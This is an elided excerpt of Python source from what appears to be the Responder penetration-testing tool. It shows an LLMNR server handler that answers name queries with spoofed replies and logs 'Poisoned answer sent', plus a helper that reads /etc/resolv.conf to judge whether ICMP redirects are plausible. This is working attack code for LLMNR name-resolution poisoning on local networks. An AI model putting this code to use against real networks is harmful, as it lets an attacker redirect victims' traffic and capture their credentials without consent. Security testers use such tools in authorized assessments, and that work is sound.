...
from responder.src.packets import LLMNR_Ans, LLMNR6_Ans
...
def IsICMPRedirectPlausible(IP):
    ...
    with open("/etc/resolv.conf", "r") as file:
        ...
        for x in dnsip:
            if (
                x != "127.0.0.1"
                and IsIPv6IP(x) is False
                and IsOnTheSameSubnet(x, IP) is False
            ):  # Temp fix to ignore IPv6 DNS addresses
                print(
                    color(
...
class LLMNR(BaseRequestHandler):  # LLMNR Server class
    def handle(self):
        try:
            ...
            if (
                RespondToThisHost(self.client_address[0].replace("::ffff:", ""), Name)
                is not True
            ):
                return None
            # IPv4
            if data[2:4] == b"\x00\x00" and LLMNRType:
                if settings.Config.AnalyzeMode:
                    ...
                    if settings.Config.TTL == None:
                        Buffer1 = LLMNR_Ans(
                            Tid=NetworkRecvBufferPython2or3(data[0:2]),
                            QuestionName=Name,
                        ...
                        Buffer1 = LLMNR_Ans(
                            ...
                            QuestionName=Name,
                            AnswerName=AnswerName,
                            TTL=settings.Config.TTL,
                        )
                    Buffer1.calculate()
                    soc.sendto(
                        NetworkSendBufferPython2or3(Buffer1), self.client_address
                    )
                    if not settings.Config.Quiet_Mode:
                        LineHeader = "[*] [LLMNR]"
                        if settings.Config.AnswerName is None:
                            ...
                            print(
                                color(
                                    "%s  Poisoned answer sent to %s for name %s (spoofed answer name %s)"
                                    % (
                                        LineHeader,
                                        self.client_address[0].replace("::ffff:", ""),
                                        Name,
